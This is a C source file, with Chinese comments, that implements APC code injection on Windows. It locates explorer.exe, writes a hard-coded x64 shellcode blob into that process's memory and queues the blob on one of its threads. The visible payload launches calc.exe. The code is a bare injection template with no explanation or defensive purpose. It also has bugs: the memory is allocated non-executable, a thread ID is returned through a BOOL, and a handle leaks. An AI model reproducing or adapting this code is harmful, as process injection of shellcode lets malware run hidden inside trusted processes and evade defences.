#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>


DWORD APC_GetProcessIdByName(LPCTSTR lpszProcessName)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        return 0;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof pe;

    if (Process32First(hSnapshot, &pe))
    {
        do {
            if (lstrcmpi(lpszProcessName, pe.szExeFile) == 0)
            {
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return 0;
}

BOOL GetAllThreadIdByProcessId(DWORD dwProcessId)
{
    DWORD dwBufferLength = 1000;
    THREADENTRY32 te32 = { 0 };
    HANDLE hSnapshot = NULL;
    BOOL bRet = TRUE;

    // 获取线程快照
    RtlZeroMemory(&te32, sizeof(te32));
    te32.dwSize = sizeof(te32);
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    // 获取第一条线程快照信息
    bRet = Thread32First(hSnapshot, &te32);
    while (bRet)
    {
        // 获取进程对应的线程ID
        if (te32.th32OwnerProcessID == dwProcessId)
        {
            return te32.th32ThreadID;
        }

        // 遍历下一个线程快照信息
        bRet = Thread32Next(hSnapshot, &te32);
    }
    return 0;
}



int APC1_injection_main() 
{

    UCHAR shellcode[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
    0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
    0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
    0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
    0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
    0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
    0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
    0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,
    0x65, 0x78, 0x65, 0x00
    };

    // FARPROC pLoadLibrary = NULL;
    HANDLE hThread = NULL;
    HANDLE hProcess = 0;
    DWORD Threadid = 0;
    DWORD ProcessId = 0;
    // BYTE DllName[] = "C:\\Users\\Black Sheep\\source\\repos\\ApcInject\\x64\\Debug\\TestDll.dll";
    LPVOID AllocAddr = NULL;

    ProcessId = APC_GetProcessIdByName("explorer.exe");
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, ProcessId);

    // pLoadLibrary = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    AllocAddr = VirtualAllocEx(hProcess, 0, sizeof(shellcode) + 1, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProcess, AllocAddr, shellcode, sizeof(shellcode) + 1, 0);
    Threadid = GetAllThreadIdByProcessId(ProcessId);
    hThread = OpenThread(THREAD_ALL_ACCESS, 0, Threadid);
    if (!hThread)
    {
        printf("OpenThread Error %d\n", GetLastError());
        return 0;
    }
    QueueUserAPC((PAPCFUNC)AllocAddr, hThread, (ULONG_PTR)NULL);
    CloseHandle(hProcess);
    CloseHandle(hThread);
    
    return 0;
}